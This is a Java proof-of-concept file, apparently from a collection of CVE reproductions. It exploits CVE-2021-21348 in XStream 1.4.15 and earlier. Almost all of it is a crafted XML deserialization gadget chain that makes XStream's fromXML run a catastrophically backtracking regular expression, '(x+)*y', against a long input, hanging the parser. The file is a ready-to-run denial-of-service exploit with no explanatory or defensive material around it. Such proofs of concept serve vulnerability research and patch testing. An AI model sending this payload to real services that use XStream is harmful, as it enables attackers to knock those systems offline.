package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * ReDOS <=1.4.15
 */
public class CVE_2021_21348 {
    public static void main(String[] args) throws IllegalAccessException, InstantiationException {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='javafx.collections.ObservableList$1'/>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "      <dataHandler>\n" +
                "        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "          <contentType>text/plain</contentType>\n" +
                "          <is class='java.io.SequenceInputStream'>\n" +
                "            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "              <iterator class='java.util.Scanner'>\n" +
                "                <buf class='java.nio.HeapCharBuffer'>\n" +
                "                  <mark>-1</mark>\n" +
                "                  <position>0</position>\n" +
                "                  <limit>0</limit>\n" +
                "                  <capacity>1024</capacity>\n" +
                "                  <address>0</address>\n" +
                "                  <hb></hb>\n" +
                "                  <offset>0</offset>\n" +
                "                  <isReadOnly>false</isReadOnly>\n" +
                "                </buf>\n" +
                "                <position>0</position>\n" +
                "                <matcher>\n" +
                "                  <parentPattern>\n" +
                "                    <pattern>\\p{javaWhitespace}+</pattern>\n" +
                "                    <flags>0</flags>\n" +
                "                  </parentPattern>\n" +
                "                  <from>0</from>\n" +
                "                  <to>0</to>\n" +
                "                  <lookbehindTo>0</lookbehindTo>\n" +
                "                  <text class='java.nio.HeapCharBuffer' reference='../../buf'/>\n" +
                "                  <acceptMode>0</acceptMode>\n" +
                "                  <first>-1</first>\n" +
                "                  <last>0</last>\n" +
                "                  <oldLast>-1</oldLast>\n" +
                "                  <lastAppendPosition>0</lastAppendPosition>\n" +
                "                  <locals/>\n" +
                "                  <hitEnd>false</hitEnd>\n" +
                "                  <requireEnd>false</requireEnd>\n" +
                "                  <transparentBounds>true</transparentBounds>\n" +
                "                  <anchoringBounds>false</anchoringBounds>\n" +
                "                </matcher>\n" +
                "                <delimPattern>\n" +
                "                  <pattern>(x+)*y</pattern>\n" +
                "                  <flags>0</flags>\n" +
                "                </delimPattern>\n" +
                "                <hasNextPosition>0</hasNextPosition>\n" +
                "                <source class='java.io.StringReader'>\n" +
                "                  <lock class='java.io.StringReader' reference='..'/>\n" +
                "                  <str>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</str>\n" +
                "                  <length>32</length>\n" +
                "                  <next>0</next>\n" +
                "                  <mark>0</mark>\n" +
                "                </source>\n" +
                "              </iterator>\n" +
                "              <type>KEYS</type>\n" +
                "            </e>\n" +
                "            <in class='java.io.ByteArrayInputStream'>\n" +
                "              <buf></buf>\n" +
                "              <pos>0</pos>\n" +
                "              <mark>0</mark>\n" +
                "              <count>0</count>\n" +
                "            </in>\n" +
                "          </is>\n" +
                "          <consumed>false</consumed>\n" +
                "        </dataSource>\n" +
                "        <transferFlavors/>\n" +
                "      </dataHandler>\n" +
                "      <dataLen>0</dataLen>\n" +
                "    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }

}
